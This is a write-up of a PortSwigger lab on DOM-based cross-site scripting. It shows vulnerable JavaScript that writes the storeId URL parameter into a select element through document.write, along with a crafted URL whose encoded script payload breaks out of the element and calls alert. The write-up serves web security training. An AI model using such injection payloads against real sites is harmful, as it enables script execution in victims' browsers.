# DOM XSS in `document.write` sink using source `location.search` inside a select element

[Lab in PortSwigger](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

## Definition
The document.write sink works with script elements, so you can use a simple payload, such as the one below:
```javascript
document.write('... <script>alert(document.domain)</script> ...');
```
Note, however, that in some situations the content that is written to document.write includes some surrounding context that you need to take account of in your exploit. For example, you might need to close some existing elements before using your JavaScript payload. 

## Notes
This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.

**Check stock JavaScript code executed when the page is loaded**
```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
// weak point - the storeId must exits, no matter what it is
if(store) {
    // any arbitrary code can be injected in this sink
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
                            
```
**Malicious URL**  
<https://0a9000f2041e17f8c07a12100072001f.web-security-academy.net/product?productId=1&storeId=Paris%22%3E%3Cscript%3Ealert(1);%3C/script%3E%3Coption%20selected=%22>

## Key Words
> xss, dom-based, dom-invader